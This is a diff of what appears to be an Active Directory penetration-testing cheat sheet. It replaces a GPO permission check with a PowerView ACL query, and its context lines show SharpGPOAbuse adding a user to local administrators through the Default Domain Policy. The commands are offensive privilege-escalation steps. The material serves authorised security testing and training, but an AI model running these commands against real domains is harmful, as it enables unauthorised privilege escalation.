@@ -311,7 +311,14 @@ Get-NetGPO | select displayname
 # Enumerate Default Domain Policy
 Get-NetGPO -Name "Default Domain Policy"
 # Check permissions of current user over Default Domain Policy GPO
-Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName <user>
+$gpo = Get-NetGPO -Name "Default Domain Policy"
+$me = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$sids = $me.Groups.Value + $me.User.Value
+Get-ObjectAcl -ResolveGUIDs -DistinguishedName $gpo.distinguishedname |
+? { $sids -contains "$($_.SecurityIdentifier)" } |
+? { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty|CreateChild|DeleteChild" }
+--> si no devuelve nada, el usuario no tiene permisos suficientes como para abusar de la GPO.
+
 # If GPO has GPOEditDeleteModifySecurity --> add user to Local Administrator group
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
 gpupdate /force
